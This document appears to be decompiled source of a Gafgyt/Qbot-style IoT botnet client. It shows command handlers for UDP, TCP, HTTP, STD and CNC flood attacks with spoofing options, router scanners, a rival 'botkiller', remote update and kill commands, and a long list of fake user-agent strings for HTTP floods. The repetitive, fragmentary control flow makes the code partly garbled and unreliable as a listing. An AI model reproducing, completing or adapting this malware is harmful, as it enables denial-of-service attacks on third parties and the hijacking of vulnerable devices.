                                                                        v295 = listFork();
                                                                            sendSTD(v239, (int16_t)v212, v213);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendSTD(v240, (int16_t)v212, v213);
                                                                        v291 = _strncmp((char *)*v132, "KILLATTK", 9);
                                                                            while (true) {
                                                        result6 = sockprintf(v142, (int32_t)"STD <target> <port> <time>");
                                        result8 = sockprintf(v142, (int32_t)"CNC <target> <port> <time>");
                                    while (true) {
                                        if (listFork() == 0) {
                                            sendHTTP(*v199, v231, (int16_t)v202, v229, v201, v200);
                                            v291 = _strncmp((char *)*v132, "KILLATTK", 9);
                                                while (true) {
                                                                sockprintf(v142, (int32_t)"None Killed.");
                                                                sockprintf(v142, (int32_t)"Killed %d.");
                                                        if (*v299 != __libc_getpid()) {
                                                            kill(v301, 9);
                                                            v295 = listFork();
                                                                sendSTD(v239, (int16_t)v212, v213);
                                                                while (true) {
                                                                    if (listFork() == 0) {
                                                                        sendSTD(v302, (int16_t)v212, v213);
                                                                v291 = _strncmp((char *)*v132, "KILLATTK", 9);
                                                                    while (true) {
                                                            v291 = _strncmp((char *)*v132, "KILLATTK", 9);
                                                                while (true) {
                                            result6 = sockprintf(v142, (int32_t)"STD <target> <port> <time>");
                                                    result7 = listFork();
                                                        sendCNC(v237, v208, v209);
                                                        v291 = _strncmp((char *)*v132, "KILLATTK", 9);
                                                            while (true) {
                                                                        v295 = listFork();
                                                                            sendSTD(v239, (int16_t)v212, v213);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendSTD(v240, (int16_t)v212, v213);
                                                                        v291 = _strncmp((char *)*v132, "KILLATTK", 9);
                                                                            while (true) {
                                                        result6 = sockprintf(v142, (int32_t)"STD <target> <port> <time>");
                                                while (true) {
                                                    if (listFork() == 0) {
                                                        sendCNC(v304, v208, v209);
                                                        __libc_close(v142);
                                                    v291 = _strncmp((char *)*v132, "KILLATTK", 9);
                                                        while (true) {
                                                                    v295 = listFork();
                                                                        sendSTD(v239, (int16_t)v212, v213);
                                                                        while (true) {
                                                                            if (listFork() != 0) {
                                                                            sendSTD(v240, (int16_t)v212, v213);
                                                                    v291 = _strncmp((char *)*v132, "KILLATTK", 9);
                                                                        while (true) {
                                                    result6 = sockprintf(v142, (int32_t)"STD <target> <port> <time>");
                                    result8 = sockprintf(v142, (int32_t)"CNC <target> <port> <time>");
                                        v291 = _strncmp((char *)*v132, "KILLATTK", 9);
                                            while (true) {
                                                        v295 = listFork();
                                                            sendSTD(v239, (int16_t)v212, v213);
                                                            while (true) {
                                                                if (listFork() != 0) {
                                                                sendSTD(v240, (int16_t)v212, v213);
                                                        v291 = _strncmp((char *)*v132, "KILLATTK", 9);
                                                            while (true) {
                                        sockprintf(v142, (int32_t)"STD <target> <port> <time>");
                                                    if (listFork() == 0) {
                                                        sendCNC(v237, v208, v209);
                                                        while (true) {
                                                            if (listFork() != 0) {
                                                            sendCNC(v238, v208, v209);
                                                            __libc_close(v142);
                                                        v291 = _strncmp((char *)*v132, "KILLATTK", 9);
                                                            while (true) {
                                                                        if (listFork() == 0) {
                                                                            sendSTD(v239, (int16_t)v212, v213);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendSTD(v240, (int16_t)v212, v213);
                                                                        v291 = _strncmp((char *)*v132, "KILLATTK", 9);
                                                                            while (true) {
                                                        sockprintf(v142, (int32_t)"STD <target> <port> <time>");
                                    sockprintf(v142, (int32_t)"CNC <target> <port> <time>");
                                                                    sockprintf(v142, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                                if (listFork() == 0) {
                                                                    sendTCP(v222, v196, v197, v198, (char *)v223, v146, v147);
                                                                    while (true) {
                                                                        if (listFork() == 0) {
                                                                            sendTCP(v145, v196, v197, v198, (char *)v223, v146, v147);
                                                                    v267 = _strncmp((char *)*v132, "HTTP", 5);
                                                                                result5 = listFork();
                                                                                    sendHTTP(*v199, v236, (int16_t)v205, v234, v204, v203);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendHTTP(*v199, v231, (int16_t)v202, v229, v201, v200);
                                                                                        v291 = _strncmp((char *)*v132, "KILLATTK", 9);
                                                                                            while (true) {
                                                                                                        if (listFork() == 0) {
                                                                                                            sendSTD(v239, (int16_t)v212, v213);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendSTD(v240, (int16_t)v212, v213);
                                                                                                        v291 = _strncmp((char *)*v132, "KILLATTK", 9);
                                                                                                            while (true) {
                                                                                        sockprintf(v142, (int32_t)"STD <target> <port> <time>");
                                                                                                    if (listFork() == 0) {
                                                                                                        sendCNC(v237, v208, v209);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendCNC(v238, v208, v209);
                                                                                                            __libc_close(v142);
                                                                                                        v291 = _strncmp((char *)*v132, "KILLATTK", 9);
                                                                                                            while (true) {
                                                                                                                        if (listFork() == 0) {
                                                                                                                            sendSTD(v239, (int16_t)v212, v213);
                                                                                                                            while (true) {
                                                                                                                                if (listFork() != 0) {
                                                                                                                                sendSTD(v240, (int16_t)v212, v213);
                                                                                                                        v291 = _strncmp((char *)*v132, "KILLATTK", 9);
                                                                                                                            while (true) {
                                                                                                        sockprintf(v142, (int32_t)"STD <target> <port> <time>");
                                                                                    sockprintf(v142, (int32_t)"CNC <target> <port> <time>");
                                                                            v291 = _strncmp((char *)*v132, "KILLATTK", 9);
                                                                                while (true) {
                                                                                            if (listFork() == 0) {
                                                                                                sendSTD(v239, (int16_t)v212, v213);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendSTD(v240, (int16_t)v212, v213);
                                                                                            v291 = _strncmp((char *)*v132, "KILLATTK", 9);
                                                                                                while (true) {
                                                                            sockprintf(v142, (int32_t)"STD <target> <port> <time>");
                                                                                        if (listFork() == 0) {
                                                                                            sendCNC(v237, v208, v209);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendCNC(v238, v208, v209);
                                                                                                __libc_close(v142);
                                                                                            v291 = _strncmp((char *)*v132, "KILLATTK", 9);
                                                                                                while (true) {
                                                                                                            if (listFork() == 0) {
                                                                                                                sendSTD(v239, (int16_t)v212, v213);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendSTD(v240, (int16_t)v212, v213);
                                                                                                            v291 = _strncmp((char *)*v132, "KILLATTK", 9);
                                                                                                                while (true) {
                                                                                            sockprintf(v142, (int32_t)"STD <target> <port> <time>");
                                                                        sockprintf(v142, (int32_t)"CNC <target> <port> <time>");
                                                            v267 = _strncmp((char *)*v132, "HTTP", 5);
                                                                        result5 = listFork();
                                                                            sendHTTP(*v199, v236, (int16_t)v205, v234, v204, v203);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendHTTP(*v199, v231, (int16_t)v202, v229, v201, v200);
                                                                                v291 = _strncmp((char *)*v132, "KILLATTK", 9);
                                                                                    while (true) {
                                                                                                if (listFork() == 0) {
                                                                                                    sendSTD(v239, (int16_t)v212, v213);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendSTD(v240, (int16_t)v212, v213);
                                                                                                v291 = _strncmp((char *)*v132, "KILLATTK", 9);
                                                                                                    while (true) {
                                                                                sockprintf(v142, (int32_t)"STD <target> <port> <time>");
                                                                                            if (listFork() == 0) {
                                                                                                sendCNC(v237, v208, v209);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendCNC(v238, v208, v209);
                                                                                                    __libc_close(v142);
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendSTD(v239, (int16_t)v212, v213);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() != 0) {
                                                                                                                        sendSTD(v240, (int16_t)v212, v213);
                                                                                                sockprintf(v142, (int32_t)"STD <target> <port> <time>");
                                                                            sockprintf(v142, (int32_t)"CNC <target> <port> <time>");
                                                                                    if (listFork() == 0) {
                                                                                        sendSTD(v239, (int16_t)v212, v213);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendSTD(v240, (int16_t)v212, v213);
                                                                    sockprintf(v142, (int32_t)"STD <target> <port> <time>");
                                                                                if (listFork() == 0) {
                                                                                    sendCNC(v237, v208, v209);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendCNC(v238, v208, v209);
                                                                                        __libc_close(v142);
                                                                                                    if (listFork() == 0) {
                                                                                                        sendSTD(v239, (int16_t)v212, v213);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendSTD(v240, (int16_t)v212, v213);
                                                                                    sockprintf(v142, (int32_t)"STD <target> <port> <time>");
                                                                sockprintf(v142, (int32_t)"CNC <target> <port> <time>");
                                                        sockprintf(v142, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                        if (listFork() == 0) {
                                                            sendTCP(v222, v196, v197, v198, (char *)v223, v146, v147);
                                                            while (true) {
                                                                if (listFork() != 0) {
                                                                sendTCP(v145, v196, v197, v198, (char *)v223, v146, v147);
                                                    v267 = _strncmp((char *)*v132, "HTTP", 5);
                                                                result5 = listFork();
                                                                    sendHTTP(*v199, v236, (int16_t)v205, v234, v204, v203);
                                                                    while (true) {
                                                                        if (listFork() != 0) {
                                                                        sendHTTP(*v199, v231, (int16_t)v202, v229, v201, v200);
                                                                                        if (listFork() == 0) {
                                                                                            sendSTD(v239, (int16_t)v212, v213);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendSTD(v240, (int16_t)v212, v213);
                                                                        sockprintf(v142, (int32_t)"STD <target> <port> <time>");
                                                                                    if (listFork() == 0) {
                                                                                        sendCNC(v237, v208, v209);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendCNC(v238, v208, v209);
                                                                                            __libc_close(v142);
                                                                                                        if (listFork() == 0) {
                                                                                                            sendSTD(v239, (int16_t)v212, v213);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendSTD(v240, (int16_t)v212, v213);
                                                                                        sockprintf(v142, (int32_t)"STD <target> <port> <time>");
                                                                    sockprintf(v142, (int32_t)"CNC <target> <port> <time>");
                                                                            if (listFork() == 0) {
                                                                                sendSTD(v239, (int16_t)v212, v213);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendSTD(v240, (int16_t)v212, v213);
                                                            sockprintf(v142, (int32_t)"STD <target> <port> <time>");
                                                                        if (listFork() == 0) {
                                                                            sendCNC(v237, v208, v209);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendCNC(v238, v208, v209);
                                                                                __libc_close(v142);
                                                                                            if (listFork() == 0) {
                                                                                                sendSTD(v239, (int16_t)v212, v213);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendSTD(v240, (int16_t)v212, v213);
                                                                            sockprintf(v142, (int32_t)"STD <target> <port> <time>");
                                                        sockprintf(v142, (int32_t)"CNC <target> <port> <time>");
                                sockprintf(v142, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                                    sockprintf(v142, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>");
                                                                        if (listFork() == 0) {
                                                                            sendUDP(v215, v183, v184, v185, v186, v150, v149, v148);
                                                                            while (true) {
                                                                                if (listFork() == 0) {
                                                                                    sendUDP(v144, v183, v184, v185, v186, v150, v149, v148);
                                                                if (listFork() == 0) {
                                                                    sendUDP(v215, v183, v184, v185, v186, v150, v149, v148);
                                                                    while (true) {
                                                                        if (listFork() != 0) {
                                                                        sendUDP(v144, v183, v184, v185, v186, v150, v149, v148);
                            sockprintf(v142, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>");
                        __GI_inet_ntoa(v143);
                        sockprintf(v142, (int32_t)"My Public IP: %s");
                    sockprintf(v142, (int32_t)"UPDATE TAKEN SUCCESFULLY");
                getdtablesize();
                sockprintf(v142, (int32_t)"%d");
            sockprintf(v142, (int32_t)"PONG!");
    v241 = _strncmp((char *)*v132, "PING", 5);
                        kill(v158, 9);
                        sockprintf(v142, (int32_t)"STOPPING SCANNER");
                        result2 = __libc_fork(3);
                            __GI_inet_ntoa(v143);
                            sockprintf(v142, (int32_t)"STARTING SCANNER ON -> %s");
                v253 = _strncmp((char *)*v132, "NETIS", 6);
                        kill(v162, 9);
                        __GI_inet_ntoa(v143);
                        sockprintf(v142, (int32_t)"STOPPING NETIS SCANNER");
                        result3 = __libc_fork(3);
                            __GI_inet_ntoa(v143);
                            sockprintf(v142, (int32_t)"STARTING NETIS SCANNER");
                            NetisScanner();
                    if (listFork() == 0) {
                        __GI_inet_ntoa(v143);
                        sockprintf(v142, (int32_t)"COMMENCING BOT KILL ON -> %s");
                        botkiller();
                v261 = _strncmp((char *)*v132, "GETPUBLICIP", 12);
                    v263 = _strncmp((char *)*v132, "UDP", 4);
                        v265 = _strncmp((char *)*v132, "TCP", 4);
                            v267 = _strncmp((char *)*v132, "HTTP", 5);
                                        result5 = listFork();
                                            sendHTTP(*v199, v236, (int16_t)v205, v234, v204, v203);
                                            while (true) {
                                                if (listFork() != 0) {
                                                sendHTTP(*v199, v231, (int16_t)v202, v229, v201, v200);
                                                                if (listFork() == 0) {
                                                                    sendSTD(v239, (int16_t)v212, v213);
                                                                    while (true) {
                                                                        if (listFork() != 0) {
                                                                        sendSTD(v240, (int16_t)v212, v213);
                                                sockprintf(v142, (int32_t)"STD <target> <port> <time>");
                                                            if (listFork() == 0) {
                                                                sendCNC(v237, v208, v209);
                                                                while (true) {
                                                                    if (listFork() != 0) {
                                                                    sendCNC(v238, v208, v209);
                                                                    __libc_close(v142);
                                                                                if (listFork() == 0) {
                                                                                    sendSTD(v239, (int16_t)v212, v213);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendSTD(v240, (int16_t)v212, v213);
                                                                sockprintf(v142, (int32_t)"STD <target> <port> <time>");
                                            sockprintf(v142, (int32_t)"CNC <target> <port> <time>");
                                                    if (listFork() == 0) {
                                                        sendSTD(v239, (int16_t)v212, v213);
                                                        while (true) {
                                                            if (listFork() != 0) {
                                                            sendSTD(v240, (int16_t)v212, v213);
                                    sockprintf(v142, (int32_t)"STD <target> <port> <time>");
                                                if (listFork() == 0) {
                                                    sendCNC(v237, v208, v209);
                                                    while (true) {
                                                        if (listFork() != 0) {
                                                        sendCNC(v238, v208, v209);
                                                        __libc_close(v142);
                                                                    if (listFork() == 0) {
                                                                        sendSTD(v239, (int16_t)v212, v213);
                                                                        while (true) {
                                                                            if (listFork() != 0) {
                                                                            sendSTD(v240, (int16_t)v212, v213);
                                                    sockprintf(v142, (int32_t)"STD <target> <port> <time>");
                                sockprintf(v142, (int32_t)"CNC <target> <port> <time>");
                                                                sockprintf(v142, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                            if (listFork() == 0) {
                                                                sendTCP(v222, v196, v197, v198, (char *)v223, v146, v147);
                                                                while (true) {
                                                                    if (listFork() != 0) {
                                                                    sendTCP(v145, v196, v197, v198, (char *)v223, v146, v147);
                                                        v267 = _strncmp((char *)*v132, "HTTP", 5);
                                                                    result5 = listFork();
                                                                        sendHTTP(*v199, v236, (int16_t)v205, v234, v204, v203);
                                                                        while (true) {
                                                                            if (listFork() != 0) {
                                                                            sendHTTP(*v199, v231, (int16_t)v202, v229, v201, v200);
                                                                                            if (listFork() == 0) {
                                                                                                sendSTD(v239, (int16_t)v212, v213);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendSTD(v240, (int16_t)v212, v213);
                                                                            sockprintf(v142, (int32_t)"STD <target> <port> <time>");
                                                                                        if (listFork() == 0) {
                                                                                            sendCNC(v237, v208, v209);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendCNC(v238, v208, v209);
                                                                                                __libc_close(v142);
                                                                                                            if (listFork() == 0) {
                                                                                                                sendSTD(v239, (int16_t)v212, v213);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendSTD(v240, (int16_t)v212, v213);
                                                                                            sockprintf(v142, (int32_t)"STD <target> <port> <time>");
                                                                        sockprintf(v142, (int32_t)"CNC <target> <port> <time>");
                                                                            if (listFork() == 0) {
                                                                                sendCNC(v237, v208, v209);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendCNC(v238, v208, v209);
                                                                                    __libc_close(v142);
                                                            sockprintf(v142, (int32_t)"CNC <target> <port> <time>");
                                                    sockprintf(v142, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                    if (listFork() == 0) {
                                                        sendTCP(v222, v196, v197, v198, (char *)v223, v146, v147);
                                                        while (true) {
                                                            if (listFork() != 0) {
                                                            sendTCP(v145, v196, v197, v198, (char *)v223, v146, v147);
                                                v267 = _strncmp((char *)*v132, "HTTP", 5);
                                                            result5 = listFork();
                                                                sendHTTP(*v199, v236, (int16_t)v205, v234, v204, v203);
                                                                while (true) {
                                                                    if (listFork() != 0) {
                                                                    sendHTTP(*v199, v231, (int16_t)v202, v229, v201, v200);
                                                                                if (listFork() == 0) {
                                                                                    sendCNC(v237, v208, v209);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendCNC(v238, v208, v209);
                                                                                        __libc_close(v142);
                                                                sockprintf(v142, (int32_t)"CNC <target> <port> <time>");
                                                                    if (listFork() == 0) {
                                                                        sendCNC(v237, v208, v209);
                                                                        while (true) {
                                                                            if (listFork() != 0) {
                                                                            sendCNC(v238, v208, v209);
                                                                            __libc_close(v142);
                                                    sockprintf(v142, (int32_t)"CNC <target> <port> <time>");
                            sockprintf(v142, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                                sockprintf(v142, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>");
                                                                    if (listFork() == 0) {
                                                                        sendUDP(v215, v183, v184, v185, v186, v150, v149, v148);
                                                                        while (true) {
                                                                            if (listFork() != 0) {
                                                                            sendUDP(v144, v183, v184, v185, v186, v150, v149, v148);
                                                            if (listFork() == 0) {
                                                                sendUDP(v215, v183, v184, v185, v186, v150, v149, v148);
                                                                while (true) {
                                                                    if (listFork() != 0) {
                                                                    sendUDP(v144, v183, v184, v185, v186, v150, v149, v148);
                        sockprintf(v142, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>");
                    __GI_inet_ntoa(v143);
                    sockprintf(v142, (int32_t)"My Public IP: %s");
                sockprintf(v142, (int32_t)"UPDATE TAKEN SUCCESFULLY");
            getdtablesize();
            sockprintf(v142, (int32_t)"%d");
        sockprintf(v142, (int32_t)"PONG!");
=================FUNCTION : _init ===================
++++++++ FUNCTION START 322
++++++++ FUNCTION END 1281
++++++++ FUNCTION LENGTH 959
        "etrbhhgetrb",
        "Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
        "Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)",
        "Mozilla/5.0 (compatible; BecomeBot/3.0; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)",
        "Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)",
        "Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0; http://www.beslist.nl/",
        "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)",
        "zspider/0.9-dev http://feedback.redkolibri.com/",
        "Mozilla/4.0 compatible ZyBorg/1.0 DLC (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
        "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
        "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)",
        "Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
        "Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)",
        "Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)",
        "Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )",
        "Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)",
        "Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)",
        "TerrawizBot/1.0 (+http://www.terrawiz.com/bot.html)",
        "FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
        "FAST-WebCrawler/3.7/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)",
        "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
        "FAST-WebCrawler/3.6/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)",
        "FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
        "findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)",
        "AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)",
        "magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)",
        "Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)",
        "Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)",
        "MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)",
        "MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)",
        "Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)",
        "MojeekBot/0.2 (archi; http://www.mojeek.com/bot.html)",
        "Moreoverbot/5.1 ( http://w.moreover.com; webmaster@moreover.com) Mozilla/5.0",
        "Moreoverbot/5.00 (+http://www.moreover.com; webmaster@moreover.com)",
        "msnbot/1.0 (+http://search.msn.com/msnbot.htm)",
        "msnbot/0.9 (+http://search.msn.com/msnbot.htm)",
        "msnbot/0.11 ( http://search.msn.com/msnbot.htm)",
        "MSNBOT/0.1 (http://search.msn.com/msnbot.htm)",
        "Mozilla/5.0 (compatible; mxbot/1.0; +http://www.chainn.com/mxbot.html)",
        "Mozilla/5.0 (compatible; mxbot/1.0; http://www.chainn.com/mxbot.html)",
        "NetResearchServer/4.0(loopimprovements.com/robot.html)",
        "NetResearchServer/3.5(loopimprovements.com/robot.html)",
        "NetResearchServer/2.8(loopimprovements.com/robot.html)",
        "NetResearchServer/2.7(loopimprovements.com/robot.html)",
        "NetResearchServer/2.5(loopimprovements.com/robot.html)",
        "Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)",
        "Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET ",
        "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
        "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)",
        "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)",
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
        "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
        "Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
        "Gigabot/3.0 (http://www.gigablast.com/spider.html)",
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)",
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)",
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)",
        "Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)",
